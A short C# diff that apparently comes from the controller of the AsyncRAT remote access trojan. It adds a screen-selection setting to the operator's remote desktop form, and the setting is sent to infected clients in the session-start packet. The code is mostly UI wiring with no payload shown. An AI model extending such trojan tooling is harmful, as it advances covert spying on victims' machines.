@@ -66,15 +66,18 @@ namespace AsyncRAT_Sharp.Forms
                 MsgPack msgpack = new MsgPack();
                 msgpack.ForcePathObject("Packet").AsString = "remoteDesktop";
                 msgpack.ForcePathObject("Quality").AsInteger = Convert.ToInt32(numericUpDown1.Value);
+                msgpack.ForcePathObject("Screen").AsInteger = Convert.ToInt32(numericUpDown2.Value);
                 decoder = new UnsafeStreamCodec(Convert.ToInt32(numericUpDown1.Value));
                 ThreadPool.QueueUserWorkItem(C.BeginSend, msgpack.Encode2Bytes());
                 numericUpDown1.Enabled = false;
+                numericUpDown2.Enabled = false;
                 button1.Text = "STOP";
             }
             else
             {
                 button1.Text = "START";
                 numericUpDown1.Enabled = true;
+                numericUpDown2.Enabled = true;
                 try
                 {
                     C2.ClientSocket.Dispose();
